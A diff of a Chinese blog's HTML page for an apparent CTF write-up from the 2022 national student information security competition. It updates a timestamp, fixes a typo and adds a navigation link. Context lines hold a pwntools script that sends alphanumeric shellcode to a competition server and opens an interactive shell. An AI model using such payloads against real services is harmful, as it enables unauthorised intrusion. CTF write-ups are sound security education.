@@ -24,7 +24,7 @@
 <meta property="og:description" content="2022 第十五届全国大学生信息安全竞赛创新实践能力赛 中个人writeup。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-05-29T15:27:25.000Z">
-<meta property="article:modified_time" content="2022-05-29T15:44:03.073Z">
+<meta property="article:modified_time" content="2022-05-30T10:55:54.668Z">
 <meta property="article:author" content="lanpesk">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="writeup">
@@ -251,7 +251,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;39.107.153.91&quot;</span>, <span class="hljs-number">30443</span>)<br>r.sendline(<span class="hljs-string">b&#x27;opt:1\nmsg:ro0t\r\n&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;opt:2\nmsg:Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\r\n&#x27;</span>)<br>r.interactive()<br><br><span class="hljs-comment"># flag&#123;2781427d-0d69-460a-abf1-c2ce4529e6de&#125;</span><br></code></pre></td></tr></table></figure>
 <p>这题也有400解了…国赛属实恐怖…</p>
 <h1 id="题外话"><a class="markdownIt-Anchor" href="#题外话"></a> 题外话</h1>
-<p>这比赛打的挺无语的，对我一个主攻Crypto的人来说…这次Crypto出的就…挺无语的，这三题能叫Crypto吗？全是非预期…还有直接拿root账户的，真的是十分有意思。华东北是真的卷，都不知道这次能不能出现了。打完这比赛我就觉得，我学了这一段时间的CTF都白学了。开始想念去年的360了。</p>
+<p>这比赛打的挺无语的，对我一个主攻Crypto的人来说…这次Crypto出的就…挺无语的，这三题能叫Crypto吗？全是非预期…还有直接拿root账户的，真的是十分有意思。华东北是真的卷，都不知道这次能不能出线了。打完这比赛我就觉得，我学了这一段时间的CTF都白学了。开始想念去年的360了。</p>
 
             </div>
             <hr>
@@ -284,6 +284,12 @@
                 <div class="post-prevnext">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2022/06/06/BSidesSF-CTF-2022/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BSidesSF CTF 2022</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
